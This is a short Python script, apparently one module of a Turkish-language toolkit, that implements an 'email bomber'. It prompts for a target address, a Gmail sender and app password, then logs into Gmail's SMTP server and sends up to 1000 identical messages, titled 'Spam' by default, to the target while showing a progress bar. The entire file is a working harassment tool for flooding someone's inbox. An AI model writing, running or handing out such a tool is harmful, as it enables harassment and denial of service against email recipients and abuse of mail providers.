import smtplib
import time
from email.mime.text import MIMEText
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()


def run():
    console.print("[#818cf8]  Email Bomber[/]")
    console.print("[dim]  Gmail uzerinden email bombalama.[/]")

    target = console.input("[bold white]  Hedef email: [/]").strip()
    sender = console.input("[bold white]  Gonderen email (Gmail): [/]").strip()
    password = console.input("[bold white]  Gmail App Password: [/]").strip()
    subject = console.input("[bold white]  Konu (varsayilan 'Spam'): [/]").strip() or "Spam"
    body = console.input("[bold white]  Mesaj: [/]").strip() or "This is a spam message."
    count_str = console.input("[bold white]  Kac email (varsayilan 10): [/]").strip()
    count = int(count_str) if count_str.isdigit() and 0 < int(count_str) <= 1000 else 10

    if not all([target, sender, password]):
        console.print("[red]  Tum alanlar zorunlu.[/]")
        return

    sent = 0
    failed = 0

    with Progress(
        SpinnerColumn(spinner_name="moon"),
        TextColumn("[#818cf8]{task.description}[/]"),
        BarColumn(bar_width=30, style="#312e81", complete_style="#818cf8"),
        TextColumn("[bold white]{task.completed}/{task.total}[/]"),
        console=console,
    ) as progress:
        task = progress.add_task("Gonderiliyor...", total=count)

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(sender, password)

            for i in range(count):
                try:
                    msg = MIMEText(body)
                    msg["Subject"] = subject
                    msg["From"] = sender
                    msg["To"] = target
                    server.sendmail(sender, target, msg.as_string())
                    sent += 1
                except Exception:
                    failed += 1
                progress.advance(task)
                time.sleep(0.3)

            server.quit()
        except Exception as e:
            console.print(f"[red]  SMTP Hatasi: {e}[/]")

    console.print(f"\n[#818cf8]  Gonderildi: {sent} | Basarisiz: {failed}[/]")
